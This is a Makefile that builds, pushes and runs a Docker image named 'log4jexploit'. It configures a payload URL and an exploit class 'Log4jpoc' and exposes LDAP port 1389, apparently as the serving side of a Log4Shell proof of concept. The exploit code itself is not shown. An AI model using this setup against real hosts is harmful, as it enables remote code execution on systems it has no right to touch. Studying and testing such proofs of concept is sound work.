ORG = ankurkatiyar
NAME = log4jexploit
VERSION = latest
DOCKER_FILE = Dockerfile
ENV_PAYLOAD = http://127.0.0.1:8888/
ENV_EXPLOIT_CLASS = Log4jpoc

.PHONY: build build-nocache tag-latest push push-latest release run

build:
	docker build --build-arg PAYLOAD=${ENV_PAYLOAD} --build-arg EXPLOIT_CLASS=${ENV_EXPLOIT_CLASS} -t $(ORG)/$(NAME):$(VERSION) -f $(DOCKER_FILE) --rm .

build-nocache:
	docker build --build-arg PAYLOAD=${ENV_PAYLOAD} --build-arg EXPLOIT_CLASS=${ENV_EXPLOIT_CLASS} -t $(ORG)/$(NAME):$(VERSION) -f $(DOCKER_FILE) --no-cache --rm .

tag-latest:
	docker tag $(ORG)/$(NAME):$(VERSION) $(NAME):latest

push:
	docker push $(ORG)/$(NAME):$(VERSION)

push-latest:
	docker push $(ORG)/$(NAME):latest

run:
	docker run -d --env ENV_PAYLOAD=$(ENV_PAYLOAD) --env ENV_EXPLOIT_CLASS=$(ENV_EXPLOIT_CLASS) -p 1389:1389 -t --name $(NAME) $(ORG)/$(NAME):$(VERSION)

stop:
	docker stop $(NAME) && docker rm $(NAME)

exec:
	docker exec -it $(NAME) bash

logs:
	docker logs $(NAME)


release: build tag-latest push push-latest run
